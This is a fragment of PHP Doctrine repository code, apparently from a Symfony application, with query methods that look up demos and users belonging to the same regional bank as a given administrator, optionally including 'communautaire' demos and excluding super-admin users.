        ->setParameter('cr', $admin->getCaisseRegionale());

    if ($filterCommunautaire) {
        $qb->andWhere('d.communautaire = true');
    }

    return $qb
        ->getQuery()
        ->getOneOrNullResult();
}






public function findOneByIdAndSameCRForAdmin(int $demoId, User $admin, bool $filterCommunautaire = false): ?Demo
{
    $qb = $this->createQueryBuilder('d')
        ->join('d.user', 'u')
        ->andWhere('d.id = :demoId')
        ->setParameter('demoId', $demoId);

    if ($filterCommunautaire) {
        // Soit même CR, soit communautaire = true
        $qb->andWhere('u.caisseRegionale = :cr OR d.communautaire = true')
           ->setParameter('cr', $admin->getCaisseRegionale());
    } else {
        // Seulement si même CR
        $qb->andWhere('u.caisseRegionale = :cr')
           ->setParameter('cr', $admin->getCaisseRegionale());
    }

    return $qb->getQuery()->getOneOrNullResult();
}




public function findUserInSameCR($matricule, $admin)
{
    return $this->createQueryBuilder('u')
        ->andWhere('u.matricule = :matricule')
        ->andWhere('u.caisseRegionale = :cr')
        ->andWhere('u.roles NOT LIKE :excludedRole')
        ->setParameter('matricule', $matricule)
        ->setParameter('cr', $admin->getCaisseRegionale())
        ->setParameter('excludedRole', '%ROLE_SUPER_ADMIN%')
        ->getQuery()
        ->getOneOrNullResult();
}
